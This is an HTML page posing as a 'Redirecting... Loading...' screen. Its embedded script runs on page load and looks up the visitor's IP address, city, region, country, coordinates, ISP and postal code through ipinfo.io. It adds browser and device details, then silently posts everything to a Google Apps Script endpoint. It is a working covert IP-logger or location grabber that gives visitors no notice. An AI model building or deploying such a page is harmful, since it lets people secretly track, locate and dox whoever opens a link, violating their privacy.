<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
</head>
<body>
  <h2>Loading...</h2>

  <script>
    async function getVisitorData() {
      const ipinfo = await fetch("https://ipinfo.io/json?token=8b7c6f2bb4015d"); // Replace with real token if needed
      const data = await ipinfo.json();

      const payload = {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country,
        loc: data.loc,
        org: data.org,
        postal: data.postal,
        browser: navigator.userAgent,
        os: navigator.platform,
        device: navigator.hardwareConcurrency || 'Unknown'
      };

      // Paste your Google Apps Script URL here:
      const endpoint = "https://script.google.com/macros/s/AKfycbwge7X4tCVPLXQjESjG0MZDD1ccEm4D0m-awxAtuJP965mT9L8UUIrycXvFsexUvGM/exec";

      await fetch(endpoint, {
        method: "POST",
        body: JSON.stringify(payload),
        headers: { "Content-Type": "application/json" }
      });
    }

    getVisitorData();
  </script>
</body>
</html>
